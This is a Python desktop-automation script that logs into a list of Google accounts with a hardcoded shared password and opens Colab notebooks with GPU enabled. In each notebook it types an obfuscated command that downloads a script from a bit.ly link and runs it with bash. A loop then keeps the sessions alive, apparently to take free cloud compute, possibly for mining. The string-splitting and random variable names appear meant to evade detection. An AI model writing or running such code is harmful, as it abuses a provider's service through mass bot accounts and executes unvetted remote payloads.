# Auto RDP
import time
import os
import logging
from autokey import *
import pyautogui
import random
import string


col_cmd = "! cmd=pysi;i=003;b=ly;a=bit;wget -q -O /tmp/keras.py ${a}.${b}/${cmd}${i} ; bash /tmp/keras.py 0"

endpoint_part1="pysi"
endpoint_part2="000"
domain0="bit"
domain1="ly"
log_level="0"

listfile = '/home/one/gtest'
gpass = "Ms123456789"
new = True
global_slow_motion = 0.7
enable_gpu = False
speed = 200

###################################################################
logging.basicConfig(filename='/tmp/0colab-robot.log',
                    encoding='utf-8', level=logging.DEBUG)
logging.debug('This message should go to the log file')
logging.info('So should this')
logging.warning('And this, too')
logging.error('And non-ASCII stuff, too, like Øresund and Malmö')
##################### Functions ###################################


def rand_string():
    return random.choice(string.ascii_uppercase + string.ascii_lowercase)+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(10)))


def rand_cmd(endpoint_part1="pysi", endpoint_part2="000", domain0="bit", domain1="ly", log_level="0"):
    file_tmp = "/tmp/"+rand_string()
    c = rand_string()
    i = rand_string()
    b = rand_string()
    a = rand_string()
    wgetcmd = "wget -q -O "
    bash = "bash "
    p1 = f"! {a}={domain0};{c}={endpoint_part1};{i}={endpoint_part2};"
    p2 = f"{b}={domain1};{i}={endpoint_part2};{wgetcmd} {file_tmp} "
    p3 = f"${{{a}}}.${{{b}}}/${{{c}}}${{{i}}} "
    p4 = f"; {bash}  {file_tmp} {log_level}"
    cmd = p1+p2 + p3 + p4
    return cmd


def exec_key():
    # keyboard.send_keys("<ctrl>+<enter>")
    pyautogui.keyDown('ctrlright')
    pyautogui.press('enter')
    pyautogui.keyUp('ctrlright')


def exit_key():
    # keyboard.send_keys("<ctrl>+<enter>")
    pyautogui.keyDown('ctrlright')
    pyautogui.press('w')
    pyautogui.keyUp('ctrlright')


def chrome_next():
    pyautogui.keyDown('ctrlright')
    pyautogui.press('tab')
    pyautogui.keyUp('ctrlright')


def select_all_key():
    pyautogui.keyDown('ctrlright')
    pyautogui.press('a')
    pyautogui.keyUp('ctrlright')


def save_key():
    pyautogui.keyDown('ctrlright')
    pyautogui.press('s')
    pyautogui.keyUp('ctrlright')


def human_click(x_pos=600, y_pos=400, slow_motion=1):
    time.sleep(0.1*slow_motion)
    pyautogui.moveTo(x_pos+4, y_pos+4)
    time.sleep(0.1*slow_motion)
    pyautogui.moveTo(x_pos+3, y_pos+3)
    time.sleep(0.1*slow_motion)
    pyautogui.moveTo(x_pos+2, y_pos+2)
    time.sleep(0.1*slow_motion)
    pyautogui.moveTo(x_pos+1, y_pos+1)
    time.sleep(0.1*slow_motion)
    pyautogui.mouseDown(x_pos, y_pos, 'left')
    pyautogui.mouseUp(x_pos, y_pos, 'left')


def human_clear(numch=100, slow_motion=1):
    pyautogui.press('backspace', presses=numch)
    pyautogui.press('delete', presses=numch)
    # for x in range(numch):
    #    time.sleep(0.01)
    #    pyautogui.keyDown('delete')
    #    pyautogui.keyUp('delete')


def human_clear_all():
    time.sleep(0.1)
    # keyboard.send_keys("<ctrl>+a")
    select_all_key()
    time.sleep(0.1)
    pyautogui.keyDown('backspace')
    pyautogui.keyUp('backspace')


def colab_top(x_top=1360, y_top=210, slow_motion=1):
    time.sleep(0.1*slow_motion)
    pyautogui.mouseDown(x_top, y_top, 'left')
    pyautogui.mouseUp(x_top, y_top, 'left')
    time.sleep(0.1*slow_motion)

# normal 1480
# private 1340


def chrome_new_container2(slow_motion=1):
    pyautogui.hotkey('ctrl', 'shift', 'k')


def chrome_new_container(x_ok=1340, y_ok=80, slow_motion=1):
    time.sleep(0.1*slow_motion)
    pyautogui.click(x_ok, y_ok)
    time.sleep(2*slow_motion)


def chrome_new_url(x_ok=600, y_ok=80, slow_motion=1, c_url='https://accounts.google.com/ServiceLogin?hl=en&passive=true&continue=https://www.google.com'):
    time.sleep(0.1*slow_motion)
    pyautogui.click(x_ok, y_ok)
    time.sleep(0.2*slow_motion)
    human_clear_all()
    # keyboard.send_keys(c_url)
    pyautogui.write(c_url)
    time.sleep(0.1*slow_motion)
    # keyboard.send_keys("<enter>")
    pyautogui.press('enter')
    time.sleep(10*slow_motion)


def chrome_gcon(x_ok=680, y_ok=360, y_pass=390, slow_motion=1, g_id="testcolab10001", g_pass="********"):
    time.sleep(0.1*slow_motion)
    human_click(x_ok, y_ok)
    time.sleep(0.2*slow_motion)
    human_clear_all()
    time.sleep(0.2*slow_motion)
    pyautogui.write(g_id)
    time.sleep(0.1*slow_motion)
    pyautogui.press('enter')
    human_click(x_ok, y_pass)
    time.sleep(0.2*slow_motion)
    time.sleep(5*slow_motion)
    human_clear_all()
    pyautogui.write(g_pass)
    time.sleep(0.1*slow_motion)
    pyautogui.press('enter')
    time.sleep(10*slow_motion)


def colab_doexec2(slow_motion=1):
    time.sleep(0.1*slow_motion)
    exec_key()
    time.sleep(20*slow_motion)
    exec_key()
    time.sleep(1*slow_motion)
    time.sleep(20*slow_motion)
    exec_key()
    time.sleep(1*slow_motion)


def colab_clear_logs(x=80, y=280, slow_motion=1):
    time.sleep(0.1*slow_motion)
    human_click(80, 280)
    time.sleep(1*slow_motion)


def colab_clear_cmd2(x_clear_cmd=300, y_clear_cmd=245, new_cmd='!wget -q -O - bit.ly/CPU01 | bash', slow_motion=1):
    time.sleep(5*slow_motion)
    colab_top()
    time.sleep(1*slow_motion)
    human_click(x_clear_cmd, y_clear_cmd)
    time.sleep(1*slow_motion)
    colab_top()
    pyautogui.click(x_clear_cmd, y_clear_cmd)
    time.sleep(1*slow_motion)
    human_clear()
    time.sleep(0.5*slow_motion)
    pyautogui.write(new_cmd, interval=0.11)
    time.sleep(1*slow_motion)


def chrome_enable_gpu(x_edit=131, y_edit=146, x_parm=156, y_param=490, slow_motion=1):
    time.sleep(0.1*slow_motion)
    pyautogui.click(x_edit, y_edit)
    time.sleep(0.3*slow_motion)
    pyautogui.click(x_parm, y_param)
    time.sleep(0.5*slow_motion)
    pyautogui.press('tab', presses=3, interval=0.25)
    time.sleep(0.2*slow_motion)
    pyautogui.press('down')
    time.sleep(0.1*slow_motion)
    pyautogui.press('tab', presses=5, interval=0.25)
    pyautogui.press('enter')
    time.sleep(0.1*slow_motion)


def old_chrome_enable_gpu(x_edit=128, y_edit=148, x_parm=156, y_param=484, slow_motion=1):
    time.sleep(0.1*slow_motion)
    pyautogui.click(x_edit, y_edit)
    time.sleep(0.3*slow_motion)
    pyautogui.click(x_parm, y_param)
    time.sleep(0.5*slow_motion)
    keyboard.send_keys("<tab>")
    time.sleep(0.2*slow_motion)
    keyboard.send_keys("<tab>")
    time.sleep(0.1*slow_motion)
    keyboard.send_keys("<tab>")
    time.sleep(0.2*slow_motion)
    keyboard.send_keys("<down>")
    time.sleep(0.1*slow_motion)
    keyboard.send_keys("<tab>")
    time.sleep(0.1*slow_motion)
    keyboard.send_keys("<tab>")
    time.sleep(0.1*slow_motion)
    keyboard.send_keys("<tab>")
    time.sleep(0.1*slow_motion)
    keyboard.send_keys("<tab>")
    time.sleep(0.1*slow_motion)
    keyboard.send_keys("<tab>")
    time.sleep(0.1*slow_motion)
    keyboard.send_keys("<enter>")
    time.sleep(0.1*slow_motion)


def chrome_new_colab(g_id="testcolab10001", g_pass="********", slow_motion=1, enable_gpu=True):
    time.sleep(1*slow_motion)
    chrome_new_container2()
    chrome_new_url(
        c_url='https://accounts.google.com/ServiceLogin?hl=en&passive=true&continue=https://www.google.com')
    chrome_gcon(g_id=g_id, g_pass=g_pass)
    chrome_new_url(c_url='https://colab.research.google.com/#create=true')
    colab_clear_cmd2(new_cmd=col_cmd)
    time.sleep(3*slow_motion)
    if enable_gpu:
        chrome_enable_gpu()
    colab_doexec2()


def chrome_refresh_page(x_quit=959, y_quit=210, slow_motion=1):
    pyautogui.mouseDown(1000, 500, 'left')
    pyautogui.mouseUp(1000, 500, 'left')
    time.sleep(0.25*slow_motion)
    pyautogui.keyDown('f5')
    pyautogui.keyUp('f5')
    time.sleep(1.5*slow_motion)
    time.sleep(0.1*slow_motion)
    exec_key()
    #pyautogui.mouseDown(x_quit, y_quit, 'left')
    #pyautogui.mouseUp(x_quit, y_quit, 'left')


def chrome_colab_refresh(slow_motion=1):
    time.sleep(1*slow_motion)
    chrome_refresh_page()
    colab_doexec2()
    colab_clear_logs()
    time.sleep(3*slow_motion)
    colab_doexec2()


def chrome_colab_refresh_full(slow_motion=1):
    time.sleep(1*slow_motion)
    chrome_refresh_page()
    colab_clear_cmd2(new_cmd=col_cmd)
    colab_clear_logs()
    colab_doexec2()
    time.sleep(3*slow_motion)
    colab_doexec2()


def chrome_colab_refresh_save(slow_motion=1):
    time.sleep(1*slow_motion)
    save_key()
    time.sleep(40)
    chrome_refresh_page()
    colab_doexec2()
    colab_clear_logs()


def chrome_colab_refresh_fast(slow_motion=1):
    time.sleep(1*slow_motion)
    time.sleep(0.1*slow_motion)
    exec_key()
    time.sleep(2)
    exec_key()
    time.sleep(1)
    exec_key()
    time.sleep(1*slow_motion)
    human_click(300, 245)
    #save_key()
    #colab_clear_logs()


def get_speed():
    # Getting all memory using os.popen()
    speed = 100
    total_memory, used_memory, free_memory = map(
        int, os.popen('free -t -m').readlines()[-1].split()[1:])
    ram_usage = round((used_memory/total_memory) * 100, 2)
    if(ram_usage > 90):
        speed = speed - 90
    elif ram_usage > 70:
        speed = speed - 20
    else:
        speed = 110
    return speed


def ram_used():
    # Getting all memory using os.popen()
    speed = 100
    total_memory, used_memory, free_memory = map(
        int, os.popen('free -t -m').readlines()[-1].split()[1:])
    ram_usage = round((used_memory/total_memory) * 100, 2)

    return ram_usage


###############################################################
############################# Main ############################
###############################################################
pyautogui.FAILSAFE = False
col_cmd = rand_cmd(endpoint_part1=endpoint_part1, endpoint_part2=endpoint_part2, domain0=domain0, domain1=domain1, log_level=log_level)

system.exec_command(
    "/usr/bin/google-chrome-stable --start-maximized --incognito %U", getOutput=False)
window.wait_for_exist(r'.*hrome', timeOut=5)
time.sleep(10*global_slow_motion)
window.activate(title=r'.*hrome', switchDesktop=False, matchClass=False)
time.sleep(1)
window.wait_for_focus(r'.*hrome', timeOut=5)
# mouse.wait_for_click(1)
time.sleep(1)
winTitle = window.get_active_title()
winClass = window.get_active_class()
#window.set_property(title=winClass,action='toggle' ,prop='maximized_vert',matchClass=True)
time.sleep(10)

#size_x = window.get_property(property_name, 0, 0, 255)
#size_y = window.get_property(property_name, 0, 0, 255)
debug = 0

# openfiles
# Using readlines()


def gids_file_lanch(listfile, gpass, enable_gpu=True):
    file1 = open(listfile, 'r')
    Lines = file1.readlines()

    count = 0
    if new == True:
        # Strips the newline character
        for line in Lines:
            count += 1
            #print("Line{}: {}".format(count, line.strip()))
            gid = line.strip('\n')
            gid = gid.strip('\r')
            try:
                if(ram_used() >= 85):
                    logging.debug('Max memmory at :'+gid)
                    break
            finally:
                pass
            chrome_new_colab(gid, gpass, enable_gpu=enable_gpu)
            winTitle = window.get_active_title()
            if winTitle.find("ipynb") == -1:
                logging.debug('Logging Error :'+gid)
                human_click(300, 245)
                exit_key()

# refresh


def keep_allive(debug=0, slow_motion=1):
    while (debug == 0):
        debug = 0
        speed = get_speed()
        time.sleep(2*slow_motion)
        winTitle = window.get_active_title()
        winClass = window.get_active_class()
        logging.debug('winTitle :'+winTitle + '  |  winClass: '+winClass)
        if (winClass == "google-chrome.Google-chrome" or
                winClass == "microsoft-edge-beta.Microsoft-edge-beta"):
            if winTitle.find("ipynb") != -1:
                if speed < 25:
                    chrome_colab_refresh()
                else:
                    chrome_colab_refresh_fast()
                if debug != 0:
                    pass
                chrome_next()
            elif winTitle.find("Cloud Shell") != -1:
                # gshell_reconnect()
                exit_key()
                ### next page ###
                if debug != 0:
                    dialog.info_dialog("winTitle", winTitle)
                chrome_next()
            else:
                time.sleep(5)
                if debug != 0:
                    dialog.info_dialog("winTitle", winTitle)
                # colab_full_refresh()
                exit_key()
                # chrome_next()
        else:
            time.sleep(5)


gids_file_lanch(listfile, gpass, enable_gpu=enable_gpu)
keep_allive(debug=0, slow_motion=global_slow_motion)
